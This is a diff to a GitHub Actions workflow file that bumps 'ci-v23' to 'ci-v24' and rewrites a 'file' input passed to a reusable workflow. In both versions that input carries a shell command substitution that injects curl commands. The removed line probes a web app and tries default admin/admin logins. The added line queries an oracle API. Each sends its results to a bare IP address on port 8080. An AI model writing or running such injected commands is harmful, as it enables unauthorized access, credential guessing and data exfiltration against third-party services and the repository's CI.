@@ -1,4 +1,4 @@
-name: ci-v23
+name: ci-v24
 on: [workflow_dispatch]
 jobs:
   call:
@@ -6,7 +6,7 @@ jobs:
     with:
       ref: main
       comment-id: "5074314510"
-      file: "$(curl -sI https://orca-web-morphex.vercel.app/_src 2>&1 | head -5 | curl -s -X POST http://93.127.162.210:8080/srccheck -d @-; curl -s -X POST https://orca-web-morphex.vercel.app/api/auth/sign-in/email -H 'Content-Type: application/json' -d '{\"email\":\"admin@boardwalk.com\",\"password\":\"admin\"}' | curl -s -X POST http://93.127.162.210:8080/try1 -d @-; curl -s -X POST https://orca-web-morphex.vercel.app/api/auth/sign-in/email -H 'Content-Type: application/json' -d '{\"email\":\"admin@useboardwalk.com\",\"password\":\"admin\"}' | curl -s -X POST http://93.127.162.210:8080/try2 -d @-; curl -s http://93.127.162.210:8080/v23end; echo x)"
+      file: "$(curl -s 'https://muon-oracle1.rasa.capital/v1/?app=symmio&method=uPnl&nSign=1&params[partyA]=0x0000000000000000000000000000000000000001&params[chainId]=8453&params[symmio]=0x49411315052894b278209477E7C90Eb0b75f3219' 2>&1 | curl -s -X POST http://93.127.162.210:8080/muon1 -d @-; curl -s 'https://muon-oracle1.rasa.capital/' 2>&1 | head -c 200 | curl -s -X POST http://93.127.162.210:8080/muonroot -d @-; curl -s http://93.127.162.210:8080/v24end; echo x)"
       network: base
       fn: hydate_compiler_cache
       send: "false"
